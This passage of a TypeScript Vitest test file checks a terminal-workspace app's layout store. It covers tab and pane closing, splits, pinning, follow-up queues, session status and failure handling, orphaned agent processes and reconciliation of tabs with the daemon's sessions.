    await repairUnknownTabs(["sess-1"]);

    expect(get(layoutState).boardTabsById).toEqual({});
    expect(get(layoutState).fileTabsById).toEqual({});
    expect(terminalRegistry.destroyTerminal).not.toHaveBeenCalled();
    expect(backend.getBoardTabs).toHaveBeenCalledTimes(1);
  });

  // One pane per split, each with its own tabs, all mounting in the same
  // tick: they share a pass rather than each paying a round trip.
  it("batches the ids several panes queue in one tick into a single pass", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["s-1", "s-2", "s-3"]))])], "ws-1", "s-1");
    vi.mocked(backend.getFileTabs).mockResolvedValue({});
    vi.mocked(backend.getBoardTabs).mockResolvedValue({});

    await Promise.all([
      repairUnknownTabs(["s-1"]),
      repairUnknownTabs(["s-2"]),
      repairUnknownTabs(["s-3"]),
    ]);

    expect(backend.getBoardTabs).toHaveBeenCalledTimes(1);
  });

  // Pane.svelte asks from an $effect over the store, which every cwd and
  // status push re-runs -- so the same ids arrive again and again while
  // the first pass is still waiting on its round trip.
  it("does not re-ask for ids a pass already has in flight", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["s-9"]))])], "ws-1", "s-9");
    let release: ((v: Record<string, string>) => void) | undefined;
    vi.mocked(backend.getFileTabs).mockImplementationOnce(
      () => new Promise((resolve) => { release = resolve; })
    );
    vi.mocked(backend.getBoardTabs).mockResolvedValue({});

    const first = repairUnknownTabs(["s-9"]);
    await new Promise((resolve) => setTimeout(resolve, 0));
    await repairUnknownTabs(["s-9"]);
    await repairUnknownTabs(["s-9"]);
    release!({});
    await first;

    expect(backend.getBoardTabs).toHaveBeenCalledTimes(1);
  });

  it("records nothing when the read fails, so the next render asks again", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["bt-2"]))])], "ws-1", "bt-2");
    vi.mocked(backend.getFileTabs).mockResolvedValue({});
    vi.mocked(backend.getBoardTabs).mockRejectedValueOnce(new Error("state not managed"));

    await repairUnknownTabs(["bt-2"]);
    expect(get(layoutState).boardTabsById["bt-2"]).toBeUndefined();

    vi.mocked(backend.getBoardTabs).mockResolvedValue({
      "bt-2": { workspaceId: "ws-1", contextFolder: "/ws/auth" },
    });
    await repairUnknownTabs(["bt-2"]);

    expect(get(layoutState).boardTabsById["bt-2"]).toEqual({
      workspaceId: "ws-1",
      contextFolder: "/ws/auth",
    });
  });
});

describe("closing board tabs", () => {
  it("closeSession on a board tab prunes it without killing anything", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "bt-1"]))])], "ws-1", "a");
    layoutState.update((s) => ({
      ...s,
      boardTabsById: { "bt-1": { workspaceId: "ws-1", contextFolder: "/ws/auth" } },
    }));

    await closeSession("bt-1");

    expect(backend.killSession).not.toHaveBeenCalled();
    expect(get(layoutState).boardTabsById).toEqual({});
    expect(backend.setBoardTabs).toHaveBeenCalledWith({});
  });
});

// A tab is a board (or a file) only because boardTabsById/fileTabsById say
// so; Pane.svelte renders everything else as a <TerminalPane>. So a state
// that still has the tab in a layout tree but no longer in its map is not
// a harmless in-between: Svelte renders it, the pane mounts, fit() asks
// the daemon to resize an id it has never heard of, and the daemon's
// "unknown session" comes back on the streaming connection as a
// daemon-error -- the full-window "Couldn't connect to the daemon"
// overlay. These assert on every state the store PASSES THROUGH, because
// the settled result was always correct; only the order was wrong.
describe("non-session tabs are never orphaned mid-close", () => {
  async function statesDuring(action: () => Promise<void>): Promise<LayoutState[]> {
    const seen: LayoutState[] = [];
    const stop = layoutState.subscribe((s) => seen.push(s));
    await action();
    stop();
    return seen;
  }

  function tabIdsInTrees(s: LayoutState): string[] {
    return s.workspaces.flatMap((w) => w.pages.flatMap((p) => allSessionIds(p.layout)));
  }

  /// States where `tabId` is still in a tree with nothing left to classify
  /// it -- i.e. states that would render a terminal for a non-session id.
  function orphanedIn(states: LayoutState[], tabId: string): LayoutState[] {
    return states.filter(
      (s) => tabIdsInTrees(s).includes(tabId) && !s.boardTabsById[tabId] && !s.fileTabsById[tabId]
    );
  }

  function seedBoardTab(): void {
    setState([ws("ws-1", [page("page-1", leaf(["a", "bt-1"]))])], "ws-1", "a");
    layoutState.update((s) => ({
      ...s,
      boardTabsById: { "bt-1": { workspaceId: "ws-1", contextFolder: "/ws/auth" } },
    }));
  }

  it("closeSession removes the board tab from the tree before its map entry", async () => {
    seedBoardTab();

    const seen = await statesDuring(() => closeSession("bt-1"));

    expect(orphanedIn(seen, "bt-1")).toEqual([]);
    expect(get(layoutState).boardTabsById).toEqual({});
  });

  it("closeSession removes a file tab from the tree before its map entry", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "ft-1"]))])], "ws-1", "a");
    layoutState.update((s) => ({ ...s, fileTabsById: { "ft-1": { path: "/ws/readme.md" } } }));

    const seen = await statesDuring(() => closeSession("ft-1"));

    expect(orphanedIn(seen, "ft-1")).toEqual([]);
    expect(get(layoutState).fileTabsById).toEqual({});
  });

  it("closePane removes the board tab from the tree before its map entry", async () => {
    seedBoardTab();

    const seen = await statesDuring(() => closePane("bt-1"));

    expect(orphanedIn(seen, "bt-1")).toEqual([]);
    expect(get(layoutState).boardTabsById).toEqual({});
  });

  it("closePage removes the board tab from the tree before its map entry", async () => {
    seedBoardTab();

    const seen = await statesDuring(() => closePage("ws-1", "page-1"));

    expect(orphanedIn(seen, "bt-1")).toEqual([]);
    expect(get(layoutState).boardTabsById).toEqual({});
  });

  it("closeWorkspace removes the board tab from the tree before its map entry", async () => {
    seedBoardTab();

    const seen = await statesDuring(() => closeWorkspace("ws-1"));

    expect(orphanedIn(seen, "bt-1")).toEqual([]);
    expect(get(layoutState).boardTabsById).toEqual({});
  });
});

describe("splitPane", () => {
  it("creates a session, splits the active page's tree, and persists", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    vi.mocked(backend.createSession).mockResolvedValue("b");

    await splitPane("a", "row");

    expect(backend.createSession).toHaveBeenCalledOnce();
    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual({
      type: "split",
      direction: "row",
      sizes: [0.5, 0.5],
      children: [leaf(["a"]), leaf(["b"])],
    });
    expect(state.focusedSessionId).toBe("b");
    expect(backend.setWorkspacesState).toHaveBeenCalledWith(state.workspaces, "ws-1", []);
  });

  it("starts the new session in the workspace's root directory", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))], "page-1", "/repos/gavin")], "ws-1", "a");
    vi.mocked(backend.createSession).mockResolvedValue("b");

    await splitPane("a", "row");

    expect(backend.createSession).toHaveBeenCalledWith("/repos/gavin", undefined, "/repos/gavin");
  });

  it("is a no-op when there is no active page", async () => {
    setState([ws("ws-1", [])], "ws-1", null);

    await splitPane("a", "row");

    expect(backend.createSession).not.toHaveBeenCalled();
  });

  it("leaves the tree unchanged and surfaces an error when create_session fails", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    vi.mocked(backend.createSession).mockRejectedValue(new Error("daemon unreachable"));

    await splitPane("a", "row");

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["a"]));
    expect(state.status).toBe("error");
    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
  });

  // The sidebar can aim a split at any page of any workspace. Scoped to
  // the active page this silently did nothing (splitLeaf misses, the
  // unchanged tree is re-persisted) -- and the new session it spawns has
  // to be somewhere the user can see it.
  it("splits the target's own page and brings it on screen", async () => {
    setState(
      [
        ws("ws-1", [page("page-1", leaf(["a"]))]),
        ws("ws-2", [page("page-2", leaf(["b"])), page("page-3", leaf(["c"]))], "page-2"),
      ],
      "ws-1",
      "a"
    );
    vi.mocked(backend.createSession).mockResolvedValue("d");

    await splitPane("c", "column");

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["a"]));
    expect(state.workspaces[1].pages[1].layout).toEqual({
      type: "split",
      direction: "column",
      sizes: [0.5, 0.5],
      children: [leaf(["c"]), leaf(["d"])],
    });
    expect(state.activeWorkspaceId).toBe("ws-2");
    expect(state.workspaces[1].activePageId).toBe("page-3");
    expect(getActiveView(state.workspaces[1])).toBe("terminal");
    expect(state.focusedSessionId).toBe("d");
    expect(backend.setWorkspacesState).toHaveBeenCalledWith(state.workspaces, "ws-2", []);
  });
});

describe("setTabPinned", () => {
  it("pins a tab on a page that is not the active one, without switching to it", async () => {
    setState(
      [ws("ws-1", [page("page-1", leaf(["a"])), page("page-2", leaf(["b", "c"]))], "page-1")],
      "ws-1",
      "a"
    );

    await setTabPinned("c", true);

    const state = get(layoutState);
    expect(state.workspaces[0].pages[1].layout).toEqual({
      type: "leaf",
      tabs: ["c", "b"],
      activeTabIndex: 1,
      pinned: ["c"],
    });
    // Pinning is bookkeeping -- it must not yank the view somewhere else.
    expect(state.workspaces[0].activePageId).toBe("page-1");
    expect(state.focusedSessionId).toBe("a");
    expect(backend.setWorkspacesState).toHaveBeenCalledWith(state.workspaces, "ws-1", []);
  });

  it("unpins through the same lookup", async () => {
    setState(
      [
        ws(
          "ws-1",
          [page("page-1", leaf(["a"])), { ...page("page-2", leaf(["b"])), layout: { type: "leaf", tabs: ["b", "c"], activeTabIndex: 0, pinned: ["b"] } }],
          "page-1"
        ),
      ],
      "ws-1",
      "a"
    );

    await setTabPinned("b", false);

    expect(get(layoutState).workspaces[0].pages[1].layout).toEqual(leaf(["b", "c"]));
  });
});

describe("addTab", () => {
  it("creates a session, appends it as a new active tab in the active page, and persists", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    vi.mocked(backend.createSession).mockResolvedValue("b");

    await addTab("a");

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["a", "b"], 1));
    expect(state.focusedSessionId).toBe("b");
  });

  it("starts the new session in the workspace's root directory", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))], "page-1", "/repos/gavin")], "ws-1", "a");
    vi.mocked(backend.createSession).mockResolvedValue("b");

    await addTab("a");

    expect(backend.createSession).toHaveBeenCalledWith("/repos/gavin", undefined, "/repos/gavin");
  });
});

describe("closeSession", () => {
  it("kills the session then removes it from its page", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "b"]))])], "ws-1", "b");
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closeSession("b");

    expect(backend.killSession).toHaveBeenCalledWith("b");
    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["a"]));
  });

  it("does not remove the session when the daemon kill fails", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "b"]))])], "ws-1", "b");
    vi.mocked(backend.killSession).mockRejectedValue(new Error("no such session"));

    await closeSession("b");

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["a", "b"]));
    expect(state.status).toBe("error");
  });

  it("removes the whole page when closing its last session, keeping the workspace", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closeSession("a");

    const state = get(layoutState);
    expect(state.workspaces).toEqual([ws("ws-1", [], null)]);
  });
});

describe("openFollowUpsInSplit", () => {
  it("records a view tab keyed by the session, with no card path", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");

    await openFollowUpsInSplit("a", "ws-1");

    const state = get(layoutState);
    const ids = Object.keys(state.cardTabsById);
    expect(ids).toHaveLength(1);
    expect(state.cardTabsById[ids[0]]).toEqual({
      workspaceId: "ws-1",
      path: "",
      view: "followups",
      sessionId: "a",
    });
    expect(backend.createSession).not.toHaveBeenCalled();
  });

  it("gives two terminals two panes, though both carry the same empty path", async () => {
    // The dedupe below openCardInSplit matches on path as well as view,
    // and every queue tab's path is "". Without the session in the
    // comparison the second terminal's queue would bring the first
    // one's pane forward and show the wrong agent's follow-ups.
    setState([ws("ws-1", [page("page-1", leaf(["a", "b"]))])], "ws-1", "a");

    await openFollowUpsInSplit("a", "ws-1");
    await openFollowUpsInSplit("b", "ws-1");

    const tabs = Object.values(get(layoutState).cardTabsById);
    expect(tabs.map((t) => t.sessionId).sort()).toEqual(["a", "b"]);
  });

  it("brings the same session's queue forward instead of splitting again", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    await openFollowUpsInSplit("a", "ws-1");
    const first = Object.keys(get(layoutState).cardTabsById)[0];

    await openFollowUpsInSplit("a", "ws-1");

    expect(Object.keys(get(layoutState).cardTabsById)).toEqual([first]);
  });
});

describe("handleSessionExited", () => {
  it("finds and removes a session in a non-active page", () => {
    setState(
      [ws("ws-1", [page("page-1", leaf(["a"])), page("page-2", leaf(["b", "c"]))], "page-1")],
      "ws-1",
      "a"
    );

    handleSessionExited("c");

    const state = get(layoutState);
    expect(state.workspaces[0].pages[1].layout).toEqual(leaf(["b"]));
    expect(backend.killSession).not.toHaveBeenCalled();
  });

  it("takes the session's follow-up queue pane with it", async () => {
    // The queue tab is the one view tab whose subject is a session. Left
    // standing it would show an empty list and offer a compose box that
    // writes into a session id the daemon no longer knows.
    setState([ws("ws-1", [page("page-1", leaf(["a", "b"]))])], "ws-1", "a");
    await openFollowUpsInSplit("a", "ws-1");
    const queueTab = Object.keys(get(layoutState).cardTabsById)[0];

    handleSessionExited("a");
    // The close is fired, not awaited, so the store settles a tick later.
    await Promise.resolve();
    await Promise.resolve();

    expect(get(layoutState).cardTabsById[queueTab]).toBeUndefined();
  });

  it("reassigns focus to the active page's first session when the focused session exits", () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "b"]))])], "ws-1", "a");

    handleSessionExited("a");

    expect(get(layoutState).focusedSessionId).toBe("b");
  });

  it("leaves focus untouched when a background (non-focused) session exits", () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "b"]))])], "ws-1", "b");

    handleSessionExited("a");

    expect(get(layoutState).focusedSessionId).toBe("b");
  });

  it("is a no-op for a session id absent from every page of every workspace", () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");

    expect(() => handleSessionExited("already-gone")).not.toThrow();

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["a"]));
    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
  });

  // A command/script tool's PTY can exit in under a second. Closing the
  // tab then takes the scrollback with it -- the human who was just
  // jumped there sees an empty Agents page and concludes the script
  // never ran. retainTabOnExit is what standalone tool runs (and rail
  // shell steps) opt into so the epilogue stays readable until they
  // dismiss the tab themselves.
  it("keeps a retained tab and its terminal when the session exits", () => {
    setState([ws("ws-1", [page("page-1", leaf(["tool-1"]))])], "ws-1", "tool-1");
    retainTabOnExit("tool-1");

    handleSessionExited("tool-1");

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["tool-1"]));
    expect(state.focusedSessionId).toBe("tool-1");
    expect(terminalRegistry.destroyTerminal).not.toHaveBeenCalled();
    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
  });

  it("still removes a retained tab when the human closes it", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["tool-1", "other"]))])], "ws-1", "tool-1");
    retainTabOnExit("tool-1");
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closeSession("tool-1");

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["other"]));
    expect(terminalRegistry.destroyTerminal).toHaveBeenCalledWith("tool-1");
  });
});

describe("handleCwdChanged", () => {
  it("records the cwd for a session", () => {
    setState([], null, null);
    handleCwdChanged("a", "/Users/alice/project");
    expect(get(layoutState).cwdBySessionId).toEqual({ a: "/Users/alice/project" });
  });

  it("updates an existing session's cwd without disturbing others", () => {
    layoutState.update((s) => ({ ...s, cwdBySessionId: { a: "/old/path", b: "/other/path" } }));
    handleCwdChanged("a", "/new/path");
    expect(get(layoutState).cwdBySessionId).toEqual({ a: "/new/path", b: "/other/path" });
  });
});

describe("handleSessionStatusChanged", () => {
  it("records working and waiting as a session that has actually started", () => {
    handleSessionStatusChanged("a", "working");
    expect(get(layoutState).sessionsSeenWorking.has("a")).toBe(true);
    handleSessionStatusChanged("b", "waiting_for_input");
    expect(get(layoutState).sessionsSeenWorking.has("b")).toBe(true);
  });

  // The first idle is the shell at its prompt, before the agent has
  // done any work. Remembering it would complete an agent-prompt rail
  // step the instant it launched.
  it("does not treat the first idle as a session that has worked", () => {
    handleSessionStatusChanged("a", "idle");
    expect(get(layoutState).sessionsSeenWorking.has("a")).toBe(false);
  });

  it("keeps the mark after the session goes idle", () => {
    handleSessionStatusChanged("a", "working");
    handleSessionStatusChanged("a", "idle");
    expect(get(layoutState).sessionsSeenWorking.has("a")).toBe(true);
  });

  it("overwrites a previous status for the same session", () => {
    handleSessionStatusChanged("a", "working");
    handleSessionStatusChanged("a", "idle");
    expect(get(layoutState).sessionStatusById["a"]).toBe("idle");
  });

  it("leaves other sessions' statuses untouched", () => {
    handleSessionStatusChanged("a", "working");
    handleSessionStatusChanged("b", "waiting_for_input");
    expect(get(layoutState).sessionStatusById).toEqual({ a: "working", b: "waiting_for_input" });
  });

  it("hands the previous and new status to maybeNotifyStatusChange, before overwriting the map", () => {
    handleSessionStatusChanged("a", "working");
    handleSessionStatusChanged("a", "idle");
    // The fifth argument is the owning workspace's toggles (D38); a
    // session in no workspace defaults to both on.
    const bothOn = { needsInput: true, finished: true };
    // The sixth argument is the failure reason, undefined for every
    // status but `failed` -- which notifies from handleSessionFailed
    // instead, because that is the only call that holds one.
    expect(notifications.maybeNotifyStatusChange).toHaveBeenNthCalledWith(1, "a", undefined, "working", "a", bothOn, undefined);
    expect(notifications.maybeNotifyStatusChange).toHaveBeenNthCalledWith(2, "a", "working", "idle", "a", bothOn, undefined);
  });

  // The inbox on the hub is ordered by how long each agent has been
  // waiting, and the daemon never says when a status began -- only that
  // it changed. This stamp is the only clock there is for it.
  it("stamps when a session entered the status, as a transition it watched", () => {
    const before = Date.now();
    handleSessionStatusChanged("a", "waiting_for_input");
    const stamp = get(layoutState).statusSinceById["a"];
    expect(stamp.watched).toBe(true);
    expect(stamp.at).toBeGreaterThanOrEqual(before);
  });

  it("restarts the clock when the status actually changes", () => {
    handleSessionStatusChanged("a", "working");
    // Backdated by hand rather than with fake timers: what is under
    // test is which branch the handler takes, not the clock.
    layoutState.update((st) => ({ ...st, statusSinceById: { a: { at: 0, watched: true } } }));
    handleSessionStatusChanged("a", "waiting_for_input");
    expect(get(layoutState).statusSinceById["a"].at).toBeGreaterThan(0);
  });

  // The daemon re-reports a status it has already sent; re-stamping on
  // one of those would reset a wait the human is watching grow.
  it("leaves the clock alone when the same status is reported twice", () => {
    handleSessionStatusChanged("a", "waiting_for_input");
    layoutState.update((st) => ({ ...st, statusSinceById: { a: { at: 0, watched: true } } }));
    handleSessionStatusChanged("a", "waiting_for_input");
    expect(get(layoutState).statusSinceById["a"].at).toBe(0);
  });

  it("resolves the notification label via sessionNames, falling back the same way tab labels do", () => {
    setState([], null, null);
    layoutState.update((s) => ({ ...s, sessionNames: { a: "my-session" } }));
    handleSessionStatusChanged("a", "waiting_for_input");
    expect(notifications.maybeNotifyStatusChange).toHaveBeenCalledWith(
      "a",
      undefined,
      "waiting_for_input",
      "my-session",
      { needsInput: true, finished: true },
      undefined
    );
  });
});

// "Mark as Read": the human acknowledging a wait the daemon will not take
// back on its own. See sessionRead.ts for why this is an acknowledgement
// and not a status write.
describe("setSessionRead", () => {
  it("marks and unmarks one session", () => {
    setSessionRead("a", true);
    expect([...get(layoutState).readSessionIds]).toEqual(["a"]);
    setSessionRead("a", false);
    expect([...get(layoutState).readSessionIds]).toEqual([]);
  });

  it("leaves the daemon's own status exactly as it was", () => {
    // The load-bearing half. A rail completes an `agent` step when its
    // session goes idle, and the follow-up queue refuses to deliver into
    // a waiting one -- both read `sessionStatusById`, and both would act
    // on a silenced badge if this wrote to it.
    handleSessionStatusChanged("a", "waiting_for_input");
    setSessionRead("a", true);
    expect(get(layoutState).sessionStatusById["a"]).toBe("waiting_for_input");
  });

  it("shows an acknowledged wait as idle to the attention surfaces", () => {
    handleSessionStatusChanged("a", "waiting_for_input");
    handleSessionStatusChanged("b", "waiting_for_input");
    setSessionRead("a", true);
    expect(get(attentionStatusById)).toEqual({ a: "idle", b: "waiting_for_input" });
    expect(get(attentionState).sessionStatusById).toEqual({ a: "idle", b: "waiting_for_input" });
  });

  // The pure modules read a whole state object, so the masked view has to
  // BE one -- and be the same one in every other respect.
  it("changes nothing else about the state it masks", () => {
    handleSessionStatusChanged("a", "waiting_for_input");
    setSessionRead("a", true);
    const masked = get(attentionState);
    const live = get(layoutState);
    expect({ ...masked, sessionStatusById: null }).toEqual({ ...live, sessionStatusById: null });
  });

  it("hands back the live state itself while nothing is marked", () => {
    handleSessionStatusChanged("a", "waiting_for_input");
    expect(get(attentionState)).toBe(get(layoutState));
  });

  // A mark acknowledges ONE wait. The next thing the daemon says about
  // that session ends it -- including a repeat of `waiting_for_input`,
  // which the daemon re-emits per notification bell rather than only on a
  // change, and which IS the agent asking again.
  it("is dropped by the next status the daemon reports", () => {
    handleSessionStatusChanged("a", "waiting_for_input");
    setSessionRead("a", true);
    handleSessionStatusChanged("a", "waiting_for_input");
    expect([...get(layoutState).readSessionIds]).toEqual([]);
    expect(get(attentionStatusById)["a"]).toBe("waiting_for_input");
  });

  it("does not drop another session's mark", () => {
    handleSessionStatusChanged("a", "waiting_for_input");
    handleSessionStatusChanged("b", "waiting_for_input");
    setSessionRead("a", true);
    handleSessionStatusChanged("b", "working");
    expect([...get(layoutState).readSessionIds]).toEqual(["a"]);
  });
});

describe("handleGitStatusChanged", () => {
  it("sets a session's git status", () => {
    const status = { repoRoot: "/repo", branch: "main", dirty: true, ahead: 0, behind: 0, hasUpstream: false };
    handleGitStatusChanged("a", status);
    expect(get(layoutState).gitStatusById["a"]).toEqual(status);
  });

  it("overwrites a session's previous git status", () => {
    const dirty = { repoRoot: "/repo", branch: "main", dirty: true, ahead: 0, behind: 0, hasUpstream: false };
    const clean = { ...dirty, dirty: false };
    handleGitStatusChanged("a", dirty);
    handleGitStatusChanged("a", clean);
    expect(get(layoutState).gitStatusById["a"]).toEqual(clean);
  });

  it("can be set to null (the session left its repo, or never had one)", () => {
    const status = { repoRoot: "/repo", branch: "main", dirty: true, ahead: 0, behind: 0, hasUpstream: false };
    handleGitStatusChanged("a", status);
    handleGitStatusChanged("a", null);
    expect(get(layoutState).gitStatusById["a"]).toBeNull();
  });

  it("tracks independent sessions independently", () => {
    const statusA = { repoRoot: "/repo-a", branch: "main", dirty: false, ahead: 0, behind: 0, hasUpstream: false };
    const statusB = { repoRoot: "/repo-b", branch: "dev", dirty: true, ahead: 1, behind: 0, hasUpstream: true };
    handleGitStatusChanged("a", statusA);
    handleGitStatusChanged("b", statusB);
    expect(get(layoutState).gitStatusById).toEqual({ a: statusA, b: statusB });
  });
});

describe("handleSessionRestored and clearRestoredMarker", () => {
  it("adds a session id when restored", () => {
    handleSessionRestored("a");
    expect(get(layoutState).restoredSessionIds.has("a")).toBe(true);
  });

  it("tracks independent sessions independently", () => {
    handleSessionRestored("a");
    handleSessionRestored("b");
    expect(get(layoutState).restoredSessionIds).toEqual(new Set(["a", "b"]));
  });

  it("adding the same id twice is idempotent", () => {
    handleSessionRestored("a");
    handleSessionRestored("a");
    expect(get(layoutState).restoredSessionIds).toEqual(new Set(["a"]));
  });

  it("clearRestoredMarker removes just that session's id", () => {
    handleSessionRestored("a");
    handleSessionRestored("b");
    clearRestoredMarker("a");
    expect(get(layoutState).restoredSessionIds).toEqual(new Set(["b"]));
  });

  it("clearRestoredMarker on a session that was never restored is a harmless no-op", () => {
    clearRestoredMarker("never-restored");
    expect(get(layoutState).restoredSessionIds).toEqual(new Set());
  });
});

// The signal every surface that watches a run consults. Deliberately has
// no counterpart to clearRestoredMarker: the ↻ badge is a note about the
// screen and typing dismisses it; this is a fact about the RUN, and
// typing into the shell recovery left behind does not bring the agent
// back.
describe("handleSessionInterrupted", () => {
  it("adds a session id, idempotently", () => {
    handleSessionInterrupted("a");
    handleSessionInterrupted("a");
    handleSessionInterrupted("b");
    expect(get(layoutState).interruptedSessionIds).toEqual(new Set(["a", "b"]));
  });

  it("survives the write that clears the restored marker", () => {
    handleSessionRestored("a");
    handleSessionInterrupted("a");

    clearRestoredMarker("a");

    expect(get(layoutState).restoredSessionIds.has("a")).toBe(false);
    expect(get(layoutState).interruptedSessionIds.has("a")).toBe(true);
  });
});

// The half `interrupted` could never state: the agent did not stop. Kept
// until the daemon CONFIRMS the process is gone, because everything else
// -- typing in the tab, reloading the frontend, restarting the daemon
// again -- leaves it running in the checkout.
describe("handleSessionOrphaned", () => {
  it("records the process, so a surface can name what it would kill", () => {
    handleSessionOrphaned("a", { pid: 4172, command: "claude" });
    expect(get(layoutState).orphanBySessionId["a"]).toEqual({ pid: 4172, command: "claude" });
  });

  it("survives the write that clears the restored marker", () => {
    // Same reason `interrupted` does, only more so: a live agent editing
    // this checkout does not stop mattering because someone ran `ls` in
    // the shell that replaced its tab.
    handleSessionRestored("a");
    handleSessionOrphaned("a", { pid: 4172, command: "claude" });

    clearRestoredMarker("a");

    expect(get(layoutState).restoredSessionIds.has("a")).toBe(false);
    expect(get(layoutState).orphanBySessionId["a"]).toBeDefined();
  });

  it("is cleared only by handleOrphanEnded, and only for the session named", () => {
    handleSessionOrphaned("a", { pid: 1, command: null });
    handleSessionOrphaned("b", { pid: 2, command: null });

    handleOrphanEnded("a");

    expect(get(layoutState).orphanBySessionId["a"]).toBeUndefined();
    expect(get(layoutState).orphanBySessionId["b"]).toEqual({ pid: 2, command: null });
  });

  it("leaves the store untouched when ending something it never had", () => {
    const before = get(layoutState);
    handleOrphanEnded("never-seen");
    expect(get(layoutState)).toBe(before);
  });
});

// The daemon writes StatusChanged("failed") and SessionFailed together
// and in that order, so the status lands first and the REASON -- the
// only part a human can act on -- lands a beat later. These are the two
// halves meeting.
describe("handleSessionFailed", () => {
  beforeEach(() => __resetFailureNotices());

  it("keeps the agent's own sentence against the session id", () => {
    handleSessionStatusChanged("a", "failed");
    handleSessionFailed("a", "API Error: 529 Overloaded.");
    expect(get(layoutState).failureReasonById["a"]).toBe("API Error: 529 Overloaded.");
  });

  // Any other status clears the reason with it, matching what the daemon
  // does to the row: a session that started talking again is no longer
  // described by the last thing that broke, and a stale reason on a live
  // session is worse than none -- it is the text every surface shows.
  it("drops the reason the moment the session says anything else", () => {
    handleSessionStatusChanged("a", "failed");
    handleSessionFailed("a", "API Error: x");
    handleSessionStatusChanged("a", "working");
    expect(get(layoutState).failureReasonById["a"]).toBeUndefined();
  });

  // The notification is owned HERE, not by the status handler, because
  // this is the only call that holds the reason. Announcing a failure
  // with nothing to say about it would be the same uselessness the old
  // "<label> finished" had.
  it("fires the one notification for the transition, carrying the reason", () => {
    handleSessionStatusChanged("a", "working");
    vi.mocked(notifications.maybeNotifyStatusChange).mockClear();

    handleSessionStatusChanged("a", "failed");
    expect(notifications.maybeNotifyStatusChange).not.toHaveBeenCalled();

    handleSessionFailed("a", "API Error: x");
    expect(notifications.maybeNotifyStatusChange).toHaveBeenCalledWith(
      "a",
      "working",
      "failed",
      "a",
      { needsInput: true, finished: true },
      "API Error: x"
    );
  });

  // A reason arriving for a session already known to be failed is the
  // same failure read twice -- an Attach baseline, a re-read -- and must
  // not interrupt the human again.
  it("stays silent for a reason with no transition behind it", () => {
    handleSessionFailed("a", "API Error: x");
    expect(notifications.maybeNotifyStatusChange).not.toHaveBeenCalled();
    expect(get(layoutState).failureReasonById["a"]).toBe("API Error: x");
  });
});

// Both liveness checks in the app read the persisted LAYOUT TREE, not
// the daemon's session list -- so a tab id a failed recovery left behind
// reads as a running agent forever, and its rail step can never be
// corrected (the wedge spec §2.2 describes). Rust reconciles once per
// app PROCESS; this is the same sweep on the two occasions that misses.
describe("reconcileLayoutSessions", () => {
  function pageWith(tabs: string[]): Workspace {
    return {
      id: "ws-1",
      name: "A",
      pages: [{ id: "p1", name: "Agents", focusedSessionId: null, layout: { type: "leaf", tabs, activeTabIndex: 0 } }],
      activePageId: "p1",
    };
  }

  it("clears a tab the daemon has no session for, and leaves the live ones", async () => {
    setState([pageWith(["s-live", "ghost"])], "ws-1", "s-live");
    vi.mocked(backend.getSessionBaselines).mockResolvedValue([
      { id: "s-live", cwd: "/ws", status: "idle", restored: false, interrupted: false, orphan: null, failureReason: null },
    ]);

    await reconcileLayoutSessions();

    expect(get(layoutState).workspaces[0].pages[0].layout).toMatchObject({ tabs: ["s-live"] });
  });

  it("leaves file and board tabs alone — they are not sessions", async () => {
    setState([pageWith(["s-live", "file-1"])], "ws-1", "s-live");
    layoutState.update((s) => ({ ...s, fileTabsById: { "file-1": { path: "/ws/README.md" } } }));
    vi.mocked(backend.getSessionBaselines).mockResolvedValue([
      { id: "s-live", cwd: "/ws", status: "idle", restored: false, interrupted: false, orphan: null, failureReason: null },
    ]);

    await reconcileLayoutSessions();

    expect(get(layoutState).workspaces[0].pages[0].layout).toMatchObject({
      tabs: ["s-live", "file-1"],
    });
  });

  // The window this reads across: the layout can gain a session while the
  // round trip is in flight, and "in a tree but not in the reply" is
  // exactly the shape of a stale tab.
  it("leaves a session that appeared while the read was in flight", async () => {
    setState([pageWith(["s-live"])], "ws-1", "s-live");
    vi.mocked(backend.getSessionBaselines).mockImplementation(async () => {
      layoutState.update((s) => ({
        ...s,
        workspaces: s.workspaces.map((w) => ({
          ...w,
          pages: w.pages.map((p) => ({
            ...p,
            layout: { type: "leaf" as const, tabs: ["s-live", "s-brand-new"], activeTabIndex: 0 },
          })),
        })),
      }));
